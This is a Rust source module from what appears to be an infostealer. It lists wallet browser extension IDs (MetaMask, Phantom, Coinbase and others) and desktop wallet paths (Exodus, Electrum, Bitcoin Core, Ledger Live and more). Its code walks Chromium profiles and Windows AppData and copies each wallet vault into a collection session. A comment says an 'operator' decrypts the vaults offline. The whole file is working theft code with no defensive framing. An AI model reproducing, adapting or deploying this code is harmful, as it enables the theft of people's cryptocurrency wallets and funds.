//! Wallet vaults: browser extension storage plus desktop wallet clients.
//!
//! Extension vaults are LevelDB directories, so they are archived as-is. The
//! operator decrypts them offline with the matching extension's key material.

use crate::browsers::chromium;
use crate::session::Session;
use crate::util;

/// Extension id -> wallet name. Ids are stable across installs.
const EXTENSIONS: &[(&str, &str)] = &[
    ("nkbihfbeogaeaoehlefnkodbefgpgknn", "metamask"),
    ("ejbalbakoplchlghecdalmeeeajnimhm", "metamask-flask"),
    ("fhbohimaelbohpjbbldcngcnapndodjp", "binance"),
    ("hnifbagmdepdbfmnakkzmbmkpolcojac", "coinbase"),
    ("bfnaelmomeimhlpmgjnjophhpkkoljpa", "phantom"),
    ("ibnejdfjmmkpcnlpebklmnkoeoihofec", "tronlink"),
    ("egjidjbpglichdcondbcbdnbeeppgdph", "trust"),
    ("acmacodkjbdgmoleebolmdjonilkdbch", "rabby"),
    ("dmkamcknogkgcdfhhbddcghachkejeap", "keplr"),
    ("bhhhlbepdkbapadjdnnojkbgioiodbic", "solflare"),
    ("ffnlhbkipagmdaoibojloalihobhning", "yoroi"),
    ("lpfcbjknijpeeillifnkikgncikgfhdo", "nami"),
    ("pnlfjkkfbkolcdlnihpigjnmjjlhfpcc", "mathwallet"),
    ("jiidiaalihmmhddjgbnbgdfflehlfjmh", "coin98"),
    ("aiifbnbfobpmeekipheeijimdpnlpgpp", "terra-station"),
    ("amkmjjmmflddogmhpjloimipbofnfjih", "wombat"),
    ("kncchdigobghenbbaddojjnnaogfppfj", "i-wallet"),
    ("mcohilncbfahbmgdjkbpemcciiolgcge", "okx"),
    ("ahkglfcpiiefapblnillghoflhhopffa", "exodus-web3"),
    ("ljfoeinjpaedjfecbmggjgodbgkmjkjk", "taho"),
];

struct DesktopWallet {
    name: &'static str,
    paths: &'static [&'static str],
    max_files: usize,
}

const DESKTOP: &[DesktopWallet] = &[
    DesktopWallet {
        name: "exodus",
        paths: &[r"Exodus\exodus.wallet", r"Exodus\exodus.wallet\backups"],
        max_files: 64,
    },
    DesktopWallet {
        name: "electrum",
        paths: &[r"Electrum\wallets"],
        max_files: 32,
    },
    DesktopWallet {
        name: "atomic",
        paths: &[r"Atomic\Local Storage\leveldb", r"atomic\Local Storage\leveldb"],
        max_files: 32,
    },
    DesktopWallet {
        name: "coinomi",
        paths: &[r"Coinomi\Coinomi\wallets"],
        max_files: 32,
    },
    DesktopWallet {
        name: "wasabi",
        paths: &[r"WalletWasabi\Client\Wallets"],
        max_files: 32,
    },
    DesktopWallet {
        name: "sparrow",
        paths: &[r"Sparrow\wallets"],
        max_files: 32,
    },
    DesktopWallet {
        name: "bitcoin-core",
        paths: &[r"Bitcoin\wallets", r"Bitcoin"],
        max_files: 8,
    },
    DesktopWallet {
        name: "litecoin-core",
        paths: &[r"Litecoin\wallets"],
        max_files: 8,
    },
    DesktopWallet {
        name: "dogecoin-core",
        paths: &[r"Dogecoin\wallets"],
        max_files: 8,
    },
    DesktopWallet {
        name: "guarda",
        paths: &[r"Guarda\Local Storage\leveldb"],
        max_files: 32,
    },
    DesktopWallet {
        name: "ledger-live",
        paths: &[r"Ledger Live"],
        max_files: 24,
    },
    DesktopWallet {
        name: "monero",
        paths: &[r"monero-gui", r"BitMonero"],
        max_files: 12,
    },
    DesktopWallet {
        name: "tonkeeper",
        paths: &[r"Tonkeeper"],
        max_files: 16,
    },
];

fn extension_vaults(session: &mut Session) -> usize {
    let mut copied = 0;
    for root in chromium::roots() {
        for profile in chromium::profile_dirs(&root.path) {
            let profile_label = profile
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_else(|| String::from("Default"));

            for (id, name) in EXTENSIONS {
                let settings = profile.join("Local Extension Settings").join(id);
                let indexed = profile
                    .join("IndexedDB")
                    .join(format!("chrome-extension_{id}_0.indexeddb.leveldb"));

                if settings.is_dir() {
                    let rel = format!("wallets/{name}/{}_{}", root.name, profile_label);
                    copied += session.copy_tree(&settings, &rel, 48, 24 * 1024 * 1024);
                }
                if indexed.is_dir() {
                    let rel = format!("wallets/{name}/{}_{}", root.name, profile_label);
                    copied += session.copy_tree(&indexed, &rel, 48, 24 * 1024 * 1024);
                }
            }
        }
    }
    copied
}

fn desktop_vaults(session: &mut Session) -> usize {
    let mut copied = 0;
    let roaming = util::env_path("APPDATA");
    let local = util::env_path("LOCALAPPDATA");

    for wallet in DESKTOP {
        for base in [&roaming, &local].into_iter().flatten() {
            for rel in wallet.paths {
                let path = base.join(rel);
                if !path.exists() {
                    continue;
                }
                if path.is_file() {
                    let name = path
                        .file_name()
                        .map(|n| n.to_string_lossy().into_owned())
                        .unwrap_or_else(|| String::from("wallet"));
                    let target = format!("wallets/{}/{name}", wallet.name);
                    if session.copy(&path, &target) {
                        copied += 1;
                    }
                    continue;
                }
                let target = format!("wallets/{}", wallet.name);
                copied += session.copy_tree(&path, &target, wallet.max_files, 24 * 1024 * 1024);
            }
        }
    }
    copied
}

pub fn collect(session: &mut Session) {
    let extensions = extension_vaults(session);
    let desktop = desktop_vaults(session);
    if extensions + desktop > 0 {
        session.note(&format!(
            "wallets: {extensions} extension files, {desktop} desktop files"
        ));
        session.line(&format!("wallets: {} files", extensions + desktop));
    } else {
        session.note("wallets: nothing found");
    }
}
